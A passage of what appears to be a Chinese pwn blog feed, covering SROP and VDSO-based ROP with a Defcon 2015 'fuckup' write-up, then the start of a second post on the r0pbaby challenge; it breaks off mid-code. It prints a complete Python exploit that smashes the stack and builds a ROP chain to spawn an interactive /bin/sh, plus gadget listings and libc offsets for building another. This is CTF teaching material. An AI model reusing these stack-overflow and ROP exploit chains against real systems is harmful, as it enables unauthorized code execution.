syscall的gadget</li><li>将signal fram中的rip(eip)设置在syscall（int 0x80)</li><li>当sigreturn返回时，就可以执行syscall<br>需要说明的是sigretrun gadget的寻找是有前人总结的</li></ul><ul><li>x86<ul><li>vdso 正常的 syscall handler也会使用的</li></ul></li><li>x64<ul><li>kernel &lt;3.3</li><li>vsyscall (0xffffffff600000) &lt;= 位置一直固定</li><li>kernel &gt;= 3.3<ul><li>libc &lt;= 普通的syscall hander也会使用<h1 id="VDSO"><a href="#VDSO" class="headerlink" title="VDSO"></a>VDSO</h1>了解了一下SROP，我们接下来可以再来学习一下什么是VDSO，以及如何直接利用VDSO做ROP<h2 id="VDSO-1"><a href="#VDSO-1" class="headerlink" title="VDSO"></a>VDSO</h2>VDSO(Virtual Dynamically-linked Shared Object)是个很有意思的东西, 它将内核态的调用映射到用户态的地址空间中, 使得调用开销更小, 路径更好.</li></ul></li></ul></li></ul><p>开销更小比较容易理解, 那么路径更好指的是什么呢? 拿x86下的系统调用举例, 传统的int 0x80有点慢, Intel和AMD分别实现了sysenter, sysexit和syscall, sysret, 即所谓的快速系统调用指令, 使用它们更快, 但是也带来了兼容性的问题. 于是Linux实现了vsyscall, 程序统一调用vsyscall, 具体的选择由内核来决定. 而vsyscall的实现就在VDSO中.</p><p>Linux(kernel 2.6 or upper)环境下执行ldd /bin/sh, 会发现有个名字叫linux-vdso.so.1(老点的版本是linux-gate.so.1)的动态文件, 而系统中却找不到它, 它就是VDSO. 例如:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~$ ldd /bin/sh</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffee4bd1000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007f5e19e56000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x0000557ef5001000)</span><br><span class="line">wings@sw:~$ </span><br></pre></td></tr></table></figure><p>为什么要用VDSO 来做ROP？<br>在X86系统中，传统的system call:int 0x80并不是由很好的效果的，因此在intel 新型的cpu提供了新的syscall指令。</p><ul><li>sysenter</li><li>sysexit<br>（Linux kernel 》= 2.6后的版本支持新型syscall机制）</li></ul><p>VDSI可以降低在传统的 int 0x80的overhead 以及提供了sigreturn 方便在signal handler结束后返回到user code<br>如何利用 VDSO 做ROP<br>我们需要知道 <strong>sysenter</strong>其参数传递方式和int 0x80是一样的，但是我们需要事前自己做好funcion prolog<br><code>push ebp;mov ebp,sp</code><br>以及需要一个 “A good gadgaet for stack pivot”，因为如果没做function prolog可以利用ebp去改变stack位置</p><h2 id="Retrun-to-vDSO"><a href="#Retrun-to-vDSO" class="headerlink" title="Retrun to vDSO"></a>Retrun to vDSO</h2><p>如何找到vdso 地址?<br>基本上里利用方法就是：</p><ol><li>要么暴力解决</li><li>利用 信息泄露 即我们所受的information leak<ul><li>使用ld.so _libc_stack_end找到 stack其实位置，计算ELF  Auxiliary vector offset 并从中取出AT_SYSINFO_EHDR </li><li>使用ld.so中的_rtld_global_ro的某个offset也有vdso的位置。<br>我们需要尤其注意的是在开了ASLR的情况下，VDSO的利用是有一定优势的<br>在x86环境下：<br>只有一个字节是随机的，所以我们可以很容易暴力解决<br>在x64环境下<br>在开启了pie的情形 有 11字节是随机的 例如：CVE-2014-9585<br>但是在linux kernel 3.182.2版本之后，这个已经增加到了18个字节的随机<h1 id="重头戏来了：Defcon-2015-Qualifier-fuckup"><a href="#重头戏来了：Defcon-2015-Qualifier-fuckup" class="headerlink" title="重头戏来了：Defcon 2015 Qualifier fuckup"></a>重头戏来了：Defcon 2015 Qualifier fuckup</h1>题目可以在这里下载： <a href="https://github.com/ctfs/write-ups-2015/tree/master/defcon-qualifier-ctf-2015/pwnable/fuckup">this</a></li></ul></li></ol><p>我们照旧来分析程序：</p><h2 id="总体上来说"><a href="#总体上来说" class="headerlink" title="总体上来说"></a>总体上来说</h2><p>程序应该是开启了ASLR 的，每次<br>用户执行命令时，FUCKUP会根据类似于WELL512的生成算法生成的随机数，改变二进制映射的存储器的基址。<br>当我们运行程序时，可以看到有一个菜单</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ ./fuckup</span><br><span class="line">Welcome to Fully Unguessable Convoluted Kinetogenic Userspace Pseudoransomization, the new and improved ASLR.</span><br><span class="line">This app is to <span class="built_in">help</span> prove the benefits of F.U.C.K.U.P.</span><br><span class="line">Main Menu</span><br><span class="line">---------</span><br><span class="line">1. Display info</span><br><span class="line">2. Change random</span><br><span class="line">3. View state info</span><br><span class="line">4. Test stack smash</span><br><span class="line">-------</span><br><span class="line">0. Quit</span><br></pre></td></tr></table></figure><p>当运行函数，以及反编译程序之后，我们可以了解程序功能。<br>当我们选择功能2的时候，“App moved to new random location”，text段和stack会被修改，重新指向新的内存地址<br>当我们选择3的时候，会告诉我们最后一个随机数(其当前determienstextbase)再次随机化text。这可以用于PRNG的预测<br>选项4：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input buffer is 10 bytes <span class="keyword">in</span> size. Accepting 100 bytes of data.</span><br><span class="line">This will crash however the location of the stack and binary are unknown to stop code execution</span><br></pre></td></tr></table></figure><p>我们在功能3找到一个mmap 地址映射函数：<br>change_random(sub_80481A6) </p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">do</span></span><br><span class="line">  &#123;</span><br><span class="line">    seedf = randf_state_(a1) * 4294967295.0;</span><br><span class="line">    seedl = (signed __int64)seedf;</span><br><span class="line">    expect = (void *)(seedl &amp; 0xFFFFF000);</span><br><span class="line">    actual = mmap(v3, 0x804CA6C, v2, a1, a2, 0);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> ( (seedl &amp; 0xFFFFF000) != actual );</span><br></pre></td></tr></table></figure><p>所以寻常的思路，我们基本是做不了了<br>大概是这样的，做了不一样的地址映射，所以其实这个题目还是要回归于VDSO以及SROP。<br>思路如下：</p><ul><li><p>32位下vdso 只有1字节是随机的，我们这里可以brute force然后利用其gadget</p></li><li><p>可以直接利用overflow return address，只有100个字节</p><ul><li>先利用vdso的gadget做出read sys call 并加大input的大小</li><li>read 读入的内容放到tls</li><li>tls位置在vdso前一个page</li><li>使用sysenter 将stack 换到tls段<br>然后，我们在第二次输入的时候 可以将 /bin/sh 放入到tls段，这里要注意但是，这个时候tls已经在栈了</li></ul></li><li><p>紧接着，我们sigreturn gadget 以及 fack signal frame一并放进，然后可以直接execve执行 /bin/sh</p></li><li><p>进行循环，知道成功getshell</p></li></ul><p>最后的exp，我没能搞定，这里可以参考 hastebin.com的脚本</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">read_until</span>(<span class="params">socket, x</span>):</span></span><br><span class="line">    data = <span class="string">b&quot;&quot;</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        data += socket.recv(<span class="number">4096</span>)</span><br><span class="line">        <span class="keyword">if</span> x <span class="keyword">in</span> data:</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> data:</span><br><span class="line">            <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;no data after: %s&quot;</span> % data)</span><br><span class="line">    <span class="keyword">return</span> data</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">skip</span>(<span class="params">socket, x</span>):</span></span><br><span class="line">    print(read_until(target, x).decode(<span class="string">&quot;utf8&quot;</span>))</span><br><span class="line">    print(<span class="string">&quot;=======&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line"></span><br><span class="line">    <span class="keyword">import</span> os</span><br><span class="line">    <span class="keyword">import</span> sys</span><br><span class="line">    <span class="keyword">import</span> time</span><br><span class="line">    <span class="keyword">import</span> struct</span><br><span class="line">    <span class="keyword">import</span> socket</span><br><span class="line">    <span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">&quot;host&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&quot;port&quot;</span>, type=int)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    target = socket.socket()</span><br><span class="line">    target.connect((args.host, args.port))</span><br><span class="line"></span><br><span class="line">    input(<span class="string">&quot;Are you ready? This is the time to attach gdb and stuff.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    skip(target, <span class="string">b&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.send(<span class="string">b&quot;4\n&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># We partially overwrite the return address, we need to comeup</span></span><br><span class="line">    <span class="comment"># with valid-in-the-future values for ebx and ebp.</span></span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">14</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x3e1b7a6c</span>)    <span class="comment"># ebx / computed</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x3e1b8000</span>)    <span class="comment"># ebp # must only be valid r/w</span></span><br><span class="line">    payload += <span class="string">b&quot;\x14&quot;</span> <span class="comment"># re-trigger init with known/constant random_seed, provided by esi.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Make sure we don&#x27;t send too much at once.</span></span><br><span class="line"></span><br><span class="line">    target.send(payload)</span><br><span class="line">    time.sleep(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">    todo = <span class="number">100</span> - len(payload)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> todo &gt; <span class="number">0</span>:</span><br><span class="line">        sending = min(<span class="number">10</span>, todo)</span><br><span class="line">        target.send(<span class="string">b&quot;a&quot;</span> * (sending - <span class="number">1</span>) + <span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">        time.sleep(<span class="number">0.2</span>)</span><br><span class="line">        todo = todo - sending</span><br><span class="line">        print(<span class="string">&quot;.&quot;</span>, end=<span class="string">&quot;&quot;</span>, flush=<span class="literal">True</span>)</span><br><span class="line">    print()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Sent first stage, waiting for menu.&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;Quit&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.send(<span class="string">b&quot;4\n&quot;</span>)</span><br><span class="line">    skip(target, <span class="string">b&quot;execution&quot;</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;Sending exploit.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_addr</span>(<span class="params">addr, name</span>):</span></span><br><span class="line">        <span class="string">&quot;&quot;&quot;Get runtime addr from ida addr.&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line">        ida_base = <span class="number">0x8048000</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># It seems under xinetd there is one more call to prng().</span></span><br><span class="line">        <span class="comment"># Not sure why this is but we just have to check what</span></span><br><span class="line">        <span class="comment"># value will be generated and use that.</span></span><br><span class="line"></span><br><span class="line">        <span class="comment"># run_base = 0x39d54000 # local no xinetd</span></span><br><span class="line">        run_base = <span class="number">0xfe97c000</span> <span class="comment"># local with xinetd</span></span><br><span class="line"></span><br><span class="line">        ret = addr + (run_base - ida_base)</span><br><span class="line"></span><br><span class="line">        print(<span class="string">&quot;%s will be at %#.8x&quot;</span> % (name, ret))</span><br><span class="line">        <span class="keyword">return</span> ret</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">pack_addr</span>(<span class="params">addr, name</span>):</span></span><br><span class="line">        <span class="keyword">return</span> struct.pack(<span class="string">&quot;&lt;I&quot;</span>, get_addr(addr, name))</span><br><span class="line"></span><br><span class="line">    payload = <span class="string">b&quot;a&quot;</span> * <span class="number">14</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)    <span class="comment"># base</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x42424242</span>)    <span class="comment"># ebp</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># This is so we can ironically expect a F.U.C.K.U.P.</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x080483C0</span>, <span class="string">&quot;welcome&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Setup syscall. ebx, ecx, edx. eax=11</span></span><br><span class="line"></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804908f</span>, <span class="string">&quot;pop eax; pop ebx; pop esi; ret&quot;</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">11</span>)            <span class="comment"># execv</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line"></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804961a</span>, <span class="string">&quot;pop edx; pop ecx; pop ebx; ret&quot;</span>)</span><br><span class="line">    payload += pack_addr(<span class="number">0x080485f9</span>, <span class="string">&quot;NULL&quot;</span>)    <span class="comment"># environ</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x080485f9</span>, <span class="string">&quot;NULL&quot;</span>)    <span class="comment"># argv</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x22222222</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Now we use this neat gadget, /bin/sh is right after us.</span></span><br><span class="line">    payload += pack_addr(<span class="number">0x0804875b</span>, <span class="string">&quot;lea ebx, [esp+4]; int 0x80&quot;</span>)</span><br><span class="line">    payload += pack_addr(<span class="number">0x08048a11</span>, <span class="string">&quot;pop; pop; ret&quot;</span>)</span><br><span class="line"></span><br><span class="line">    payload += <span class="string">b&quot;/bin/sh\x00&quot;</span></span><br><span class="line">    payload += struct.pack(<span class="string">&quot;&lt;I&quot;</span>, <span class="number">0x44444444</span>)    <span class="comment"># eip, too lazy for clean exit.</span></span><br><span class="line"></span><br><span class="line">    payload = payload.ljust(<span class="number">100</span>, <span class="string">b&quot;\xcc&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Ok, sanity check and good to go.</span></span><br><span class="line">    <span class="keyword">assert</span> len(payload) &lt;= <span class="number">100</span>, <span class="string">&quot;payload too large, %d bytes.&quot;</span> % len(payload)</span><br><span class="line"></span><br><span class="line">    target.send(payload)</span><br><span class="line">    skip(target, <span class="string">b&quot;F.U.C.K.U.P.&quot;</span>)</span><br><span class="line"></span><br><span class="line">    target.set_inheritable(<span class="literal">True</span>)</span><br><span class="line"></span><br><span class="line">    print(<span class="string">&quot;You should be able to type stuff now.&quot;</span>)</span><br><span class="line">    os.system(<span class="string">&quot;socat STDIO FD:%d&quot;</span> % target.fileno())</span><br></pre></td></tr></table></figure></div><script src="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/js/lightgallery.min.js"></script><script>if (typeof lightGallery !== 'undefined') {        var options = {            selector: '.gallery-item'        };        lightGallery(document.getElementsByClassName('.article-gallery')[0], options);        }</script>]]></content>
      
      
      <categories>
          
          <category> Summary </category>
          
      </categories>
      
      
        <tags>
            
            <tag> pwn </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基础栈溢出复习 二 之 ROP</title>
      <link href="stack-overflow-two-ROP.html"/>
      <url>stack-overflow-two-ROP.html</url>
      
        <content type="html"><![CDATA[<link rel="stylesheet" type="text/css" href="https://cdn.jsdelivr.net/lightgallery.js/1.0.1/css/lightgallery.min.css" /><div class=".article-gallery"<h4 id="现代栈溢出利用技术基础：ROP"><a href="#现代栈溢出利用技术基础：ROP" class="headerlink" title="现代栈溢出利用技术基础：ROP"></a>现代栈溢出利用技术基础：ROP</h4><p>承接上一个篇目，这里继续讲ROP的一些题目分析。讲真的，我这里基本上的题目以及攻击方式都来自于<em>Atum</em>师傅在X-MAN的PPT。</p><h5 id="CTF中ROP的常规套路"><a href="#CTF中ROP的常规套路" class="headerlink" title="CTF中ROP的常规套路:"></a>CTF中ROP的常规套路:</h5><ul><li>第一次触发漏洞，通过ROP泄漏libc的address(如puts_got)，计算system地址，然后返回到一个可以重现触发漏洞的位置(如main)，再次触发漏洞，通过ROP调用system(“/bin/sh”)</li><li>直接execve(“/bin/sh”, [“/bin/sh”], NULL)，通常在静态链接时比较常用<br>三个练习:</li><li>Defcon 2015 Qualifier：R0pbaby</li><li>AliCTF 2016：vss</li><li>PlaidCTF 2013: ropasaurusrex<br>相关题目我们可以在<a href="https://github.com/ctfs/">CTFs</a>上找到。<h5 id="Defcon-2015-Qualifier：R0pbaby"><a href="#Defcon-2015-Qualifier：R0pbaby" class="headerlink" title="Defcon 2015 Qualifier：R0pbaby"></a>Defcon 2015 Qualifier：R0pbaby</h5></li></ul><p>我们拿到题目，可以先对题目进行检查，可先看看题目开启的保护</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ checksec</span><br><span class="line">CANARY    : disabled</span><br><span class="line">FORTIFY   : ENABLED</span><br><span class="line">NX        : ENABLED</span><br><span class="line">PIE       : disabled</span><br><span class="line">RELRO     : disabled</span><br></pre></td></tr></table></figure><p>gdb-peda 自带的 checksec 有检测程序是否开启保护，以及所开启的保护。我们可以看到，<em>R0pbaby</em> 所开启的保护有FORTIFY以及NX，这里我们主要所收到的限制是栈上写入的数据不可执行。<br>以及，程序可以知道是６４位的，它的传参优先由寄存器完成。<br>接着，我们应该了解程序的流程，以及找到程序的漏洞，以及思考其利用方式。</p><p>*尝试运行程序</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-01.png"></a></p><p>我们去尝试运行，摸清了基本上的程序的功能。</p><ol><li>功能1，可以获得libc的基址</li><li>功能2，可以获得函数的地址</li><li>功能3，输入的地方，感觉这个地方可能存在漏洞。</li></ol><p>紧接着，我们可以用IDA 分析程序了。</p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-02.png"></a></p><p>发现一个函数的不适当应用，拷贝的过程中没有判断大小，可能造成缓冲区溢出。</p><hr><p>函数原型<br>void  * memcpy(void*dest, const void * src, size_t n);<br>由src指向地址为起始地址的连续n个字节的数据复制到以destin指向地址为起始地址的空间内。</p><hr><p>savedregs是一个IDA关键字，我们可以看到 保存的堆栈帧指针和函数返回地址：在IDA中，我们可以直接单击它。<br><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-03.png"></a></p><p><a href="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png" class="gallery-item"><img src="https://blog-1252049492.cos.ap-hongkong.myqcloud.com/img/bof-2-04.png"></a></p><p>buf的大小应该是8没错，之后可能造成缓冲区溢出，那么我的解题思路大概是如下：</p><ol><li>我们需要找到一个gadget RDI 用来起shell</li><li>其次我们需要找到 “bin/sh”的地址</li><li>最后，我们需要找到system函数的地址</li></ol><p>完成上面三个步骤，我们就可以去构造我们的ROP链来getshell。</p><h5 id="如何找到-pop-rdi"><a href="#如何找到-pop-rdi" class="headerlink" title="如何找到 pop rdi"></a>如何找到 <code>pop rdi</code></h5><p>我们需要找到:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pop rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure><p>如此的指令，<br>我们可以通过简单的objdump来寻找简单的gadget</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~&#x2F;桌面&#x2F;Rop$ python ROPgadget.py --binary &#x2F;lib&#x2F;x86_64-linux-gnu&#x2F;libc.so.6 --only &quot;pop|ret&quot;</span><br><span class="line">Gadgets information</span><br><span class="line">0x00000000000206c1 : pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b5a23 : pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb11 : pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012bf16 : pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x0000000000020252 : pop rbp ; pop r14 ; pop r15 ; pop rbp ; ret</span><br><span class="line">0x00000000000210fe : pop rbp ; pop r14 ; pop r15 ; ret</span><br><span class="line">0x00000000000ccb05 : pop rbp ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e6 : pop rbp ; pop r14 ; ret</span><br><span class="line">0x000000000006d128 : pop rbp ; pop rbp ; ret</span><br><span class="line">0x0000000000048438 : pop rbp ; pop rbx ; ret</span><br><span class="line">0x000000000001f930 : pop rbp ; ret</span><br><span class="line">0x00000000000ccb01 : pop rbx ; pop r12 ; pop r13 ; pop r14 ; pop rbp ; ret</span><br><span class="line">0x000000000006d124 : pop rbx ; pop r12 ; pop r13 ; pop rbp ; ret</span><br><span class="line">0x00000000000398c5 : pop rbx ; pop r12 ; pop rbp ; ret</span><br><span class="line">0x00000000000202e1 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x00000000000206c0 : pop rbx ; pop rbp ; pop r12 ; pop r13 ; ret</span><br><span class="line">0x00000000000b5a22 : pop rbx ; pop rbp ; pop r12 ; pop r14 ; ret</span><br><span class="line">0x000000000001fb10 : pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x000000000012bf15 : pop rbx ; pop rbp ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000001f92f : pop rbx ; pop rbp ; ret</span><br><span class="line">0x000000000002a69a : pop rbx ; ret</span><br><span class="line">0x0000000000001b18 : pop rbx ; ret 0x2a63</span><br><span class="line">0x0000000000185240 : pop rbx ; ret 0x6f9</span><br><span class="line">0x000000000013c01f : pop rcx ; pop rbx ; pop rbp ; pop r12 ; pop r13 ; pop r14 ; ret</span><br><span class="line">0x000000000010134b : pop rcx ; pop rbx ; pop rbp ; pop r12 ; ret</span><br><span class="line">0x00000000000e9aba : pop rcx ; pop rbx ; ret</span><br><span class="line">0x0000000000001b17 : pop rcx ; pop rbx ; ret 0x2a63</span><br><span class="line">0x00000000000fc3e2 : pop rcx ; ret</span><br><span class="line">0x0000000000020256 : pop rdi ; pop rbp ; ret</span><br><span class="line">0x0000000000021102 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>因为是本地测试，所以我先查看自己本地的libc.so.6<br>确认libc.so.6</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/桌面/Rop$ ldd r0pbaby</span><br><span class="line">linux-vdso.so.1 =&gt;  (0x00007ffff7ffd000)</span><br><span class="line">libdl.so.2 =&gt; /lib/x86_64-linux-gnu/libdl.so.2 (0x00007ffff7bd9000)</span><br><span class="line">libc.so.6 =&gt; /lib/x86_64-linux-gnu/libc.so.6 (0x00007ffff7810000)</span><br><span class="line">/lib64/ld-linux-x86-64.so.2 (0x0000555555554000)</span><br></pre></td></tr></table></figure><figure class="highlight sh"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">wings@sw:~/桌面/Rop$ strings -a -tx /lib/x86_64-linux-gnu/libc.so.6 | grep <span class="string">&quot;/bin/sh&quot;</span></span><br><span class="line"> 18c177 /bin/sh</span><br></pre></td></tr></table></figure><p>可以知道 偏移是0x18c177</p><p>至于sytem函数，程序的第二个功能已经给我们了，至此，我们可以开始构造我们的exp了.</p><p>system = 0x00007FFFF784F390  #get_libc_base()<br>rdi_gadget_offset = 0x21102<br>bin_sh_offset = 0x18c177<br>system_offset = 0x45390</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span 